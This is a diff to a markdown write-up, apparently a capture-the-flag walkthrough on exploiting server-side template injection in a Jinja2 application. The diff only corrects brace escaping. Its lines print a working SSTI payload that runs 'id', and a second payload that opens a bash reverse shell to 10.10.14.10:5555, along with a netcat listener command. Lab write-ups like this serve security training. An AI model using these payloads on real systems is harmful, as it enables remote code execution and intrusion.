@@ -192,12 +192,12 @@ We can detect SSTI vulnerabilities by fuzzing the application's fields. From <ht
 It works! There are many other commands we could try, for example we could execute the id command with the following syntax:
 
 ````
-\{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() \}}
+\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() \}\}
 `````
 However, let's go straight for a reverse shell with the following command (we also start a netcat listener before executing it):
 
 ````
-\\\{\\\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c "bash -i>& /dev/tcp/10.10.14.10/5555 0>&1"').read() \\\}\\\}
+\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c "bash -i>& /dev/tcp/10.10.14.10/5555 0>&1"').read() \}\}
 sudo nc -nlvp 5555
 `````
 After confirming the changes, we indeed receive a reverse shell:
